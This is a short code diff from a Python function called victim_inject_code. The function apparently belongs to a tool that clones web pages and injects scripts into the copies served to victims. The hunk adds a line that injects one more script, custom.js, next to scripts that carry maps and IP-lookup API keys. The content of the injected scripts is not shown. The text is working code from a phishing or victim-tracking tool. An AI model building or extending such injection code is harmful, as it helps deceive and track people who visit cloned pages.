@@ -71,6 +71,7 @@ def victim_inject_code(html, script = 'a', url_to_clone = '', gMapsApiKey = 'AIz
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/libs.min.js"></script></head>')
     html = html.replace('</head>', '<script type="text/javascript">window.gMapsApiKey="' + str(gMapsApiKey) + '"; window.IpInfoApiKey="' + str(IpInfoApiKey) + '";</script></head>')
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/base.js"></script></head>')
+    html = html.replace('</head>', '<script type="text/javascript" src="/static/js/custom.js"></script></head>')
     html = html.replace('</head>', '<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>')
     return html
 
